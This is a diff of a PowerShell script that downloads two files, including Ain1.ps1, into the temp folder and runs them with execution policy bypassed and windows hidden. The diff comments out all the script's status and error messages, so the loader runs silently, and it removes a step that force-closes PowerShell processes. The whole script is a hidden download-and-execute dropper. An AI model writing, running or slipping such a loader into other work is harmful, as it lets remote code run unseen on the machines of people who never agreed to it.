@@ -11,18 +11,18 @@ $destination2 = "$env:TEMP\Ain1.ps1"
 try {
     Invoke-WebRequest -Uri $url1 -OutFile $destination1 -ErrorAction Stop
     # Output the path to confirm where the first file was saved
-    Write-Output "First file downloaded to: $destination1"
+    # Write-Output "First file downloaded to: $destination1"
 } catch {
-    Write-Output "Error: Unable to download file from $url1"
+    # Write-Output "Error: Unable to download file from $url1"
 }
 
 # Use Invoke-WebRequest to download the second file with error handling
 try {
     Invoke-WebRequest -Uri $url2 -OutFile $destination2 -ErrorAction Stop
     # Output the path to confirm where the second file was saved
-    Write-Output "Second file downloaded to: $destination2"
+    # Write-Output "Second file downloaded to: $destination2"
 } catch {
-    Write-Output "Error: Unable to download file from $url2"
+    # Write-Output "Error: Unable to download file from $url2"
 }
 
 
@@ -33,12 +33,3 @@ Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Wind
 
 # Run the second script (Ain1.ps1) from the %TEMP% directory after the first finishes
 Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\Ain1.ps1`""
-
-# Optionally, you can include a delay to ensure the scripts have time to start
-Start-Sleep -Seconds 1
-
-# Close all PowerShell instances
-Get-Process powershell | Stop-Process -Force
-
-# Exit the script
-exit
